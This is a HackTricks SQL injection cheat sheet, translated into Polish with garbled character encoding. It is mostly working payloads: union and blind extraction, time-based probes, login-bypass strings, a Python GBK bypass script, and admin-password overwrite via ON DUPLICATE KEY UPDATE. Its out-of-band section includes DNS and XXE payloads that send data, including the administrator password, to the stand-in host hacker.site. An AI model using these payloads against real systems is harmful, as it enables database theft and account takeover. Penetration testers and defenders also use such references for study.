# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. Z **misjÄ… promowania wiedzy technicznej**, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w z dziedziny technologii i cyberbezpieczeÅ„stwa w kaÅ¼dej dyscyplinie.

{% embed url="https://www.rootedcon.com/" %}

## Co to jest SQL injection?

**SQL injection** to luka w zabezpieczeniach, ktÃ³ra pozwala atakujÄ…cym na **ingerencjÄ™ w zapytania do bazy danych** aplikacji. Ta podatnoÅ›Ä‡ moÅ¼e umoÅ¼liwiÄ‡ atakujÄ…cym **wyÅ›wietlanie**, **modyfikowanie** lub **usuwanie** danych, do ktÃ³rych nie powinni mieÄ‡ dostÄ™pu, w tym informacji o innych uÅ¼ytkownikach lub jakichkolwiek danych, do ktÃ³rych aplikacja ma dostÄ™p. Takie dziaÅ‚ania mogÄ… prowadziÄ‡ do trwaÅ‚ych zmian w funkcjonalnoÅ›ci lub treÅ›ci aplikacji, a nawet do kompromitacji serwera lub odmowy usÅ‚ugi.

## Wykrywanie punktu wejÅ›cia

Gdy strona wydaje siÄ™ byÄ‡ **podatna na SQL injection (SQLi)** z powodu nietypowych odpowiedzi serwera na dane wejÅ›ciowe zwiÄ…zane z SQLi, **pierwszym krokiem** jest zrozumienie, jak **wstrzyknÄ…Ä‡ dane do zapytania bez zakÅ‚Ã³cania go**. Wymaga to skutecznego zidentyfikowania metody **ucieczki z bieÅ¼Ä…cego kontekstu**. Oto kilka przydatnych przykÅ‚adÃ³w:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
NastÄ™pnie musisz wiedzieÄ‡, jak **naprawiÄ‡ zapytanie, aby nie byÅ‚o bÅ‚Ä™dÃ³w**. Aby naprawiÄ‡ zapytanie, moÅ¼esz **wprowadziÄ‡** dane, aby **poprzednie zapytanie zaakceptowaÅ‚o nowe dane**, lub moÅ¼esz po prostu **wprowadziÄ‡** swoje dane i **dodaÄ‡ symbol komentarza na koÅ„cu**.

_Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy._

### **Komentarze**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Potwierdzanie za pomocÄ… operacji logicznych

WiarygodnÄ… metodÄ… potwierdzenia podatnoÅ›ci na SQL injection jest wykonanie **operacji logicznej** i obserwowanie oczekiwanych wynikÃ³w. Na przykÅ‚ad, parametr GET taki jak `?username=Peter`, ktÃ³ry zwraca identycznÄ… treÅ›Ä‡ po modyfikacji na `?username=Peter' or '1'='1`, wskazuje na podatnoÅ›Ä‡ na SQL injection.

Podobnie, zastosowanie **operacji matematycznych** sÅ‚uÅ¼y jako skuteczna technika potwierdzajÄ…ca. Na przykÅ‚ad, jeÅ›li dostÄ™p do `?id=1` i `?id=2-1` daje ten sam wynik, to wskazuje na SQL injection.

PrzykÅ‚ady ilustrujÄ…ce potwierdzenie operacji logicznych:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Ta lista sÅ‚Ã³w zostaÅ‚a stworzona, aby sprÃ³bowaÄ‡ **potwierdziÄ‡ SQLinjections** w zaproponowany sposÃ³b:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Potwierdzanie z uÅ¼yciem czasu

W niektÃ³rych przypadkach **nie zauwaÅ¼ysz Å¼adnej zmiany** na stronie, ktÃ³rÄ… testujesz. Dlatego dobrym sposobem na **odkrycie Å›lepych SQL injections** jest zmuszenie bazy danych do wykonania dziaÅ‚aÅ„, co bÄ™dzie miaÅ‚o **wpÅ‚yw na czas**, jaki potrzebuje strona do zaÅ‚adowania.\
Dlatego w zapytaniu SQL dodamy operacjÄ™, ktÃ³ra zajmie duÅ¼o czasu na zakoÅ„czenie:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
W niektÃ³rych przypadkach **funkcje sleep nie bÄ™dÄ… dozwolone**. Wtedy, zamiast uÅ¼ywaÄ‡ tych funkcji, moÅ¼esz sprawiÄ‡, Å¼e zapytanie **wykona zÅ‚oÅ¼one operacje**, ktÃ³re zajmÄ… kilka sekund. _PrzykÅ‚ady tych technik bÄ™dÄ… komentowane osobno dla kaÅ¼dej technologii (jeÅ›li takie istniejÄ…)_.

### Identyfikacja Back-endu

Najlepszym sposobem na identyfikacjÄ™ back-endu jest prÃ³ba wykonania funkcji rÃ³Å¼nych back-endÃ³w. MoÅ¼esz uÅ¼yÄ‡ _**funkcji sleep**_ z poprzedniej sekcji lub tych (tabela z [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
RÃ³wnieÅ¼, jeÅ›li masz dostÄ™p do wyniku zapytania, moÅ¼esz **wydrukowaÄ‡ wersjÄ™ bazy danych**.

{% hint style="info" %}
W kontynuacji omÃ³wimy rÃ³Å¼ne metody wykorzystania rÃ³Å¼nych rodzajÃ³w SQL Injection. UÅ¼yjemy MySQL jako przykÅ‚adu.
{% endhint %}

### Identyfikacja z PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Wykorzystywanie oparte na Union

### Wykrywanie liczby kolumn

JeÅ›li moÅ¼esz zobaczyÄ‡ wynik zapytania, to jest to najlepszy sposÃ³b na jego wykorzystanie.\
Przede wszystkim musimy ustaliÄ‡ **liczbÄ™** **kolumn**, ktÃ³re **poczÄ…tkowe zapytanie** zwraca. Dzieje siÄ™ tak, poniewaÅ¼ **oba zapytania muszÄ… zwracaÄ‡ tÄ™ samÄ… liczbÄ™ kolumn**.\
Do tego celu zazwyczaj stosuje siÄ™ dwie metody:

#### Order/Group by

Aby okreÅ›liÄ‡ liczbÄ™ kolumn w zapytaniu, stopniowo dostosowuj liczbÄ™ uÅ¼ywanÄ… w klauzulach **ORDER BY** lub **GROUP BY**, aÅ¼ otrzymasz faÅ‚szywÄ… odpowiedÅº. Pomimo odmiennych funkcji **GROUP BY** i **ORDER BY** w SQL, obie mogÄ… byÄ‡ wykorzystywane w ten sam sposÃ³b do ustalenia liczby kolumn zapytania.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Wybierz coraz wiÄ™cej wartoÅ›ci null, aÅ¼ zapytanie bÄ™dzie poprawne:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_You should use `null`values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case._

### WyciÄ…ganie nazw baz danych, nazw tabel i nazw kolumn

W nastÄ™pnych przykÅ‚adach wyciÄ…gniemy nazwÄ™ wszystkich baz danych, nazwÄ™ tabeli w bazie danych oraz nazwy kolumn tabeli:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_KaÅ¼da baza danych ma inny sposÃ³b odkrywania tych danych, ale metodologia zawsze jest ta sama._

## Wykorzystywanie ukrytej injekcji opartej na unii

Gdy wynik zapytania jest widoczny, ale injekcja oparta na unii wydaje siÄ™ nieosiÄ…galna, oznacza to obecnoÅ›Ä‡ **ukrytej injekcji opartej na unii**. Taki scenariusz czÄ™sto prowadzi do sytuacji z niewidocznÄ… injekcjÄ…. Aby przeksztaÅ‚ciÄ‡ niewidocznÄ… injekcjÄ™ w opartÄ… na unii, naleÅ¼y rozpoznaÄ‡ zapytanie wykonawcze na zapleczu.

MoÅ¼na to osiÄ…gnÄ…Ä‡ poprzez zastosowanie technik niewidocznej injekcji wraz z domyÅ›lnymi tabelami specyficznymi dla twojego systemu zarzÄ…dzania bazÄ… danych (DBMS). Aby zrozumieÄ‡ te domyÅ›lne tabele, zaleca siÄ™ zapoznanie z dokumentacjÄ… docelowego DBMS.

Gdy zapytanie zostaÅ‚o wyodrÄ™bnione, konieczne jest dostosowanie Å‚adunku, aby bezpiecznie zamknÄ…Ä‡ oryginalne zapytanie. NastÄ™pnie do twojego Å‚adunku dodawane jest zapytanie unii, co uÅ‚atwia wykorzystanie nowo dostÄ™pnej injekcji opartej na unii.

Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe informacje, zapoznaj siÄ™ z peÅ‚nym artykuÅ‚em dostÄ™pnym pod adresem [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Wykorzystywanie opartej na bÅ‚Ä™dach

JeÅ›li z jakiegoÅ› powodu **nie moÅ¼esz** zobaczyÄ‡ **wyniku** **zapytania**, ale moÅ¼esz **widzieÄ‡ komunikaty o bÅ‚Ä™dach**, moÅ¼esz wykorzystaÄ‡ te komunikaty o bÅ‚Ä™dach do **ekstrahowania** danych z bazy danych.\
Podobnie jak w przypadku wykorzystywania opartej na unii, moÅ¼esz zdoÅ‚aÄ‡ zrzuciÄ‡ bazÄ™ danych.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Wykorzystywanie Blind SQLi

W tym przypadku nie moÅ¼esz zobaczyÄ‡ wynikÃ³w zapytania ani bÅ‚Ä™dÃ³w, ale moÅ¼esz **rozrÃ³Å¼niÄ‡**, kiedy zapytanie **zwraca** odpowiedÅº **prawda** lub **faÅ‚sz**, poniewaÅ¼ na stronie sÄ… rÃ³Å¼ne treÅ›ci.\
W tym przypadku moÅ¼esz wykorzystaÄ‡ to zachowanie, aby zrzuciÄ‡ bazÄ™ danych znak po znaku:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Wykorzystywanie Error Blind SQLi

To jest **ten sam przypadek co wczeÅ›niej**, ale zamiast rozrÃ³Å¼niaÄ‡ odpowiedÅº prawda/faÅ‚sz z zapytania, moÅ¼esz **rozrÃ³Å¼niaÄ‡ miÄ™dzy** **bÅ‚Ä™dem** w zapytaniu SQL a jego brakiem (moÅ¼e dlatego, Å¼e serwer HTTP siÄ™ zawiesza). Dlatego w tym przypadku moÅ¼esz wymusiÄ‡ bÅ‚Ä…d SQL za kaÅ¼dym razem, gdy poprawnie zgadniesz znak:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Wykorzystywanie SQLi opartego na czasie

W tym przypadku **nie ma** sposobu na **rozrÃ³Å¼nienie** **odpowiedzi** zapytania w oparciu o kontekst strony. Jednak moÅ¼esz sprawiÄ‡, Å¼e strona **bÄ™dzie siÄ™ Å‚adowaÄ‡ dÅ‚uÅ¼ej**, jeÅ›li zgadniÄ™ty znak jest poprawny. JuÅ¼ wczeÅ›niej widzieliÅ›my tÄ™ technikÄ™ w uÅ¼yciu, aby [potwierdziÄ‡ lukÄ™ SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

MoÅ¼esz uÅ¼yÄ‡ zÅ‚oÅ¼onych zapytaÅ„, aby **wykonaÄ‡ wiele zapytaÅ„ z rzÄ™du**. ZauwaÅ¼, Å¼e podczas gdy kolejne zapytania sÄ… wykonywane, **wyniki** **nie sÄ… zwracane do aplikacji**. Dlatego ta technika jest gÅ‚Ã³wnie uÅ¼yteczna w odniesieniu do **Å›lepych luk** bezpieczeÅ„stwa, gdzie moÅ¼esz uÅ¼yÄ‡ drugiego zapytania do wywoÅ‚ania zapytania DNS, bÅ‚Ä™du warunkowego lub opÃ³Åºnienia czasowego.

**Oracle** nie obsÅ‚uguje **zÅ‚oÅ¼onych zapytaÅ„.** **MySQL, Microsoft** i **PostgreSQL** je obsÅ‚ugujÄ…: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

JeÅ›li **Å¼adna inna** metoda eksploatacji **nie zadziaÅ‚aÅ‚a**, moÅ¼esz sprÃ³bowaÄ‡ sprawiÄ‡, aby **baza danych wyekstrahowaÅ‚a** informacje do **zewnÄ™trznego hosta** kontrolowanego przez Ciebie. Na przykÅ‚ad, za pomocÄ… zapytaÅ„ DNS:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Ekstrakcja danych poza pasmem za pomocÄ… XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Automatyzowane Wykorzystanie

SprawdÅº [SQLMap Cheatsheet](sqlmap/), aby wykorzystaÄ‡ lukÄ™ SQLi za pomocÄ… [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informacje specyficzne dla technologii

OmÃ³wiliÅ›my juÅ¼ wszystkie sposoby wykorzystania luki SQL Injection. ZnajdÅº wiÄ™cej sztuczek zaleÅ¼nych od technologii bazy danych w tej ksiÄ…Å¼ce:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Lub znajdziesz **wiele sztuczek dotyczÄ…cych: MySQL, PostgreSQL, Oracle, MSSQL, SQLite i HQL w** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. Z **misjÄ… promowania wiedzy technicznej**, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w technologii i cyberbezpieczeÅ„stwa w kaÅ¼dej dziedzinie.

{% embed url="https://www.rootedcon.com/" %}

## OminiÄ™cie uwierzytelniania

Lista do prÃ³by ominiÄ™cia funkcji logowania:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### OminiÄ™cie uwierzytelniania za pomocÄ… surowego hasha
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
To zapytanie pokazuje lukÄ™, gdy MD5 jest uÅ¼ywane z wartoÅ›ciÄ… true dla surowego wyjÅ›cia w kontrolach uwierzytelniania, co sprawia, Å¼e system jest podatny na SQL injection. AtakujÄ…cy mogÄ… to wykorzystaÄ‡, tworzÄ…c dane wejÅ›ciowe, ktÃ³re po zhashowaniu generujÄ… nieoczekiwane czÄ™Å›ci poleceÅ„ SQL, prowadzÄ…c do nieautoryzowanego dostÄ™pu.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### OminiÄ™cie uwierzytelniania za pomocÄ… wstrzykniÄ™tego hasha
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Zalecana lista**:

PowinieneÅ› uÅ¼ywaÄ‡ jako nazwy uÅ¼ytkownika kaÅ¼dej linii z listy, a jako hasÅ‚a zawsze: _**Pass1234.**_\
_(Te Å‚adunki sÄ… rÃ³wnieÅ¼ zawarte w duÅ¼ej liÅ›cie wspomnianej na poczÄ…tku tej sekcji)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Authentication Bypass

JEÅšLI ' jest escapowane, moÅ¼esz uÅ¼yÄ‡ %A8%27, a gdy ' zostanie escapowane, zostanie utworzone: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Skrypt Pythona:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Wstrzykiwanie poliglotowe (wielokontekstowe)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Zmiana hasÅ‚a istniejÄ…cego obiektu/uÅ¼ytkownika

Aby to zrobiÄ‡, powinieneÅ› sprÃ³bowaÄ‡ **utworzyÄ‡ nowy obiekt nazwany "obiektem gÅ‚Ã³wnym"** (prawdopodobnie **admin** w przypadku uÅ¼ytkownikÃ³w) modyfikujÄ…c coÅ›:

* UtwÃ³rz uÅ¼ytkownika o nazwie: **AdMIn** (wielkie i maÅ‚e litery)
* UtwÃ³rz uÅ¼ytkownika o nazwie: **admin=**
* **Atak przycinania SQL** (gdy istnieje jakiÅ› **limit dÅ‚ugoÅ›ci** w nazwie uÅ¼ytkownika lub e-mailu) --> UtwÃ³rz uÅ¼ytkownika o nazwie: **admin \[duÅ¼o spacji] a**

#### Atak przycinania SQL

JeÅ›li baza danych jest podatna, a maksymalna liczba znakÃ³w dla nazwy uÅ¼ytkownika wynosi na przykÅ‚ad 30 i chcesz podszyÄ‡ siÄ™ pod uÅ¼ytkownika **admin**, sprÃ³buj utworzyÄ‡ nazwÄ™ uÅ¼ytkownika: "_admin \[30 spacji] a_" i dowolne hasÅ‚o.

Baza danych **sprawdzi**, czy wprowadzona **nazwa uÅ¼ytkownika** **istnieje** w bazie danych. JeÅ›li **nie**, **przetnie** **nazwÄ™ uÅ¼ytkownika** do **maksymalnej dozwolonej liczby znakÃ³w** (w tym przypadku do: "_admin \[25 spacji]_") i automatycznie **usunie wszystkie spacje na koÅ„cu, aktualizujÄ…c** w bazie danych uÅ¼ytkownika "**admin**" z **nowym hasÅ‚em** (moÅ¼e pojawiÄ‡ siÄ™ jakiÅ› bÅ‚Ä…d, ale to nie oznacza, Å¼e to nie zadziaÅ‚aÅ‚o).

WiÄ™cej informacji: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Uwaga: Ten atak nie bÄ™dzie juÅ¼ dziaÅ‚aÅ‚ tak, jak opisano powyÅ¼ej w najnowszych instalacjach MySQL. ChociaÅ¼ porÃ³wnania nadal ignorujÄ… biaÅ‚e znaki na koÅ„cu domyÅ›lnie, prÃ³ba wstawienia ciÄ…gu, ktÃ³ry jest dÅ‚uÅ¼szy niÅ¼ dÅ‚ugoÅ›Ä‡ pola, spowoduje bÅ‚Ä…d, a wstawienie nie powiedzie siÄ™. Aby uzyskaÄ‡ wiÄ™cej informacji na ten temat, sprawdÅº: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert time based checking

Dodaj tyle `','',''`, ile uwaÅ¼asz, aby wyjÅ›Ä‡ z instrukcji VALUES. JeÅ›li opÃ³Åºnienie zostanie wykonane, masz SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

Klauzula `ON DUPLICATE KEY UPDATE` w MySQL jest wykorzystywana do okreÅ›lenia dziaÅ‚aÅ„, ktÃ³re baza danych ma podjÄ…Ä‡, gdy prÃ³ba wstawienia wiersza spowoduje duplikat wartoÅ›ci w indeksie UNIQUE lub PRIMARY KEY. PoniÅ¼szy przykÅ‚ad demonstruje, jak ta funkcja moÅ¼e byÄ‡ wykorzystana do zmiany hasÅ‚a konta administratora:

Example Payload Injection:

Åadunek iniekcji moÅ¼e byÄ‡ skonstruowany w nastÄ™pujÄ…cy sposÃ³b, gdzie prÃ³buje siÄ™ wstawiÄ‡ dwa wiersze do tabeli `users`. Pierwszy wiersz jest wabikiem, a drugi wiersz celuje w istniejÄ…cy adres e-mail administratora z zamiarem zaktualizowania hasÅ‚a:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Oto jak to dziaÅ‚a:

- Zapytanie prÃ³buje wstawiÄ‡ dwa wiersze: jeden dla `generic_user@example.com` i drugi dla `admin_generic@example.com`.
- JeÅ›li wiersz dla `admin_generic@example.com` juÅ¼ istnieje, klauzula `ON DUPLICATE KEY UPDATE` uruchamia siÄ™, instruujÄ…c MySQL do zaktualizowania pola `password` istniejÄ…cego wiersza na "bcrypt_hash_of_newpassword".
- W konsekwencji, moÅ¼na nastÄ™pnie sprÃ³bowaÄ‡ uwierzytelniÄ‡ siÄ™ za pomocÄ… `admin_generic@example.com` z hasÅ‚em odpowiadajÄ…cym haszowi bcrypt ("bcrypt_hash_of_newpassword" reprezentuje hasz bcrypt nowego hasÅ‚a, ktÃ³ry powinien byÄ‡ zastÄ…piony rzeczywistym haszem poÅ¼Ä…danego hasÅ‚a).

### Ekstrakcja informacji

#### Tworzenie 2 kont jednoczeÅ›nie

Podczas prÃ³by utworzenia nowego uÅ¼ytkownika potrzebne sÄ… nazwa uÅ¼ytkownika, hasÅ‚o i e-mail:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### UÅ¼ywanie dziesiÄ™tnego lub szesnastkowego

Z tÄ… technikÄ… moÅ¼esz wyodrÄ™bniÄ‡ informacje, tworzÄ…c tylko 1 konto. WaÅ¼ne jest, aby zauwaÅ¼yÄ‡, Å¼e nie musisz nic komentowaÄ‡.

UÅ¼ywajÄ…c **hex2dec** i **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Aby uzyskaÄ‡ tekst, moÅ¼esz uÅ¼yÄ‡:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
UÅ¼ywajÄ…c **hex** i **replace** (oraz **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. Z **misjÄ… promowania wiedzy technicznej**, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w z dziedziny technologii i cyberbezpieczeÅ„stwa w kaÅ¼dej dyscyplinie.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection to sytuacja, w ktÃ³rej zapytanie, ktÃ³re moÅ¼na wstrzyknÄ…Ä‡, nie jest tym, ktÃ³re daje wynik, ale wynik zapytania, ktÃ³re moÅ¼na wstrzyknÄ…Ä‡, trafia do zapytania, ktÃ³re daje wynik. ([Z dokumentu](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

PrzykÅ‚ad:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

